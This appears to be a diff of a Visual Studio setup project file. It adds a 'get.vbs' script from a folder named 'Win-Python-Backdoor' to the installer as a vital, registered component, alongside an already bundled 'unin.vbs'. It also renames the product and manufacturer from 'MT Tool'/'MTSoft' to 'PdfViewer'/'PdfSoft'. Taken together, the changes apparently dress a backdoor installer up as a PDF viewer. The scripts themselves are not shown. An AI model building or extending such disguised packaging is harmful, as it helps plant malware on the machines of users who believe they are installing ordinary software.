@@ -75,6 +75,12 @@
         }
         "Entry"
         {
+        "MsmKey" = "8:_A977488A1FDD47EDA2164C1FF791D06D"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
         "MsmKey" = "8:_FA1D03CCC97B41A3B09C011C0BABBFB0"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
@@ -381,6 +387,26 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_A977488A1FDD47EDA2164C1FF791D06D"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\get.vbs"
+            "TargetName" = "8:get.vbs"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FA1D03CCC97B41A3B09C011C0BABBFB0"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\unin.vbs"
@@ -479,9 +505,9 @@
         "Product"
         {
         "Name" = "8:Microsoft Visual Studio"
-        "ProductName" = "8:MT Tool"
+        "ProductName" = "8:PdfViewer"
         "ProductCode" = "8:{98F8450D-4A66-4E18-8FCE-08606DE0F6C6}"
-        "PackageCode" = "8:{7BBF9B2E-5247-4B76-B7D6-FDCF726A32BE}"
+        "PackageCode" = "8:{F23769C9-8BC9-4CD9-AE5B-12835F8EBEE9}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
@@ -489,12 +515,12 @@
         "DetectNewerInstalledVersion" = "11:TRUE"
         "InstallAllUsers" = "11:FALSE"
         "ProductVersion" = "8:1.0.8"
-        "Manufacturer" = "8:MTSoft"
+        "Manufacturer" = "8:PdfSoft"
         "ARPHELPTELEPHONE" = "8:"
         "ARPHELPLINK" = "8:"
-        "Title" = "8:MT Tool"
+        "Title" = "8:PdfViewer"
         "Subject" = "8:"
-        "ARPCONTACT" = "8:MTSoft"
+        "ARPCONTACT" = "8:PdfSoft"
         "Keywords" = "8:"
         "ARPCOMMENTS" = "8:"
         "ARPURLINFOABOUT" = "8:"
